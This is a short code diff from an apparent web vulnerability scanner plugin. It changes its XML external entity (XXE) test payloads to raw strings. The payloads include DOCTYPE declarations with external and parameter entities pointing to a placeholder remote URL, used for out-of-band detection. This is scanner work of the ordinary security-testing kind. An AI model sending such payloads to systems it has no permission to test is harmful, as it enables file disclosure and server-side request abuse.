@@ -21,8 +21,8 @@ class Z0SCAN(PluginBase):
         if not self.fingerprints.waf and self.requests.suffix in acceptedExt:
             if self.requests.post_hint == POST_HINT.XML:
                 payloads = [
-                    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE convert [<!ENTITY % remote SYSTEM "{}">%remote;]>',
-                    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo SYSTEM "{}">'
+                    r'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE convert [<!ENTITY % remote SYSTEM "{}">%remote;]>',
+                    r'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo SYSTEM "{}">'
                 ]
                 url = self.requests.url
                 payloads = ()
@@ -58,8 +58,8 @@ class Z0SCAN(PluginBase):
                                 break
             elif self.requests.params or self.requests.post_hint == POST_HINT.NORMAL or self.requests.post_hint == POST_HINT.ARRAY_LIKE:
                 payloads = [
-                    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE convert [<!ENTITY % remote SYSTEM "{}">%remote;]>',
-                    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE uuu SYSTEM "{}">'
+                    r'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE convert [<!ENTITY % remote SYSTEM "{}">%remote;]>',
+                    r'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE uuu SYSTEM "{}">'
                     ]
                 iterdatas = self.generateItemdatas()
                 test_args = []
